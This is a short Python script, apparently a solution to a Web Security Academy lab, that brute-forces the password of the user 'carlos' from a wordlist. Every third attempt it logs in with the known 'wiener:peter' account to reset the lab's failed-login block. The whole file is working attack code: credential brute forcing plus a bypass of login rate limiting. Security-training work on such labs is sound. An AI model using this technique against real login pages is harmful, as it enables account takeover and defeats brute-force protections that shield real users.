import requests
from rich.console import Console
from rich.text import Text
from rich.theme import Theme
custom_theme = Theme({
    "info": "dim cyan",
    "warning": "magenta",
    "danger": "bold red"
})
console= Console(theme=custom_theme)

usernames_file= open('passwords.txt', 'r')
lines = usernames_file.readlines()

URL = "https://0a4600b204be161884ef968000e5006a.web-security-academy.net/login"

status = console.status(status="[bold green]Password brute-forcing", spinner='circle')

status.start()
usernames = []
counter = 0


for line in lines:
    data_c = {
        'username' : 'carlos',
        'password' : line.strip()
    }

    if counter==2:
        data = {
            'username' : 'wiener',
            'password' : 'peter'
        }
        response = requests.post(url=URL, data=data)
        counter=0

    response = requests.post(url=URL, data=data_c)
    #print(response.content)
    if "Incorrect password" not in response.text:
        status.stop()
        console.print('Password for carlos found', style='warning')
        console.print(data_c['password'], style='danger')
        break
    counter+=1
    
    
            

    
status.stop()
"""
data = {
        'username' : 'carlos',
        'password' : 'line.strip()'
    }
response = requests.post(url=URL, data=data)
print(response.status_code)

print(str(response.text))

print()
print()

data = {
        'username' : 'wiener',
        'password' : 'peter'
    }
response = requests.post(url=URL, data=data)
print(response.status_code)
print(str(response.text))

"""